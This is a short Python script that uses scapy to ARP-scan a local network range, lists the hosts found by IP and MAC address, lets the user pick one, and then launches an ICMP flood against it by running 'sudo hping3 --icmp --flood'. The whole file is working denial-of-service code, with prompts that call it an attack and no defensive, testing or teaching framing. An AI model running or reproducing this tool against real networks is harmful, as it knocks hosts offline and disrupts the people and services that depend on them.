import scapy.all as scapy
import subprocess

def arp_scan(ip_range):
    arp_responses = []
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
    for res in answered_lst:
        arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})
    return arp_responses

def print_arp_res(arp_res):
    print("\nID\t\tIP Address\t\tMAC Address")
    print("-" * 50)
    for id, res in enumerate(arp_res):
        print(f"{id}\t\t{res['ip']}\t\t{res['mac']}")
    while True:
        try:
            choice = int(input("\nSelect target ID to start ICMP flood (Ctrl+C to exit): "))
            if 0 <= choice < len(arp_res):
                return arp_res[choice]['ip']
        except KeyboardInterrupt:
            print("\nUser exited.")
            exit()
        except:
            print("Invalid choice. Try again.")

def run_hping3(target_ip):
    print(f"\nStarting ICMP flood on {target_ip} using hping3...\n")
    try:
        subprocess.run(["sudo", "hping3", "--icmp", "--flood", target_ip])
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        exit()
    except Exception as e:
        print(f"Error running hping3: {e}")
        exit()
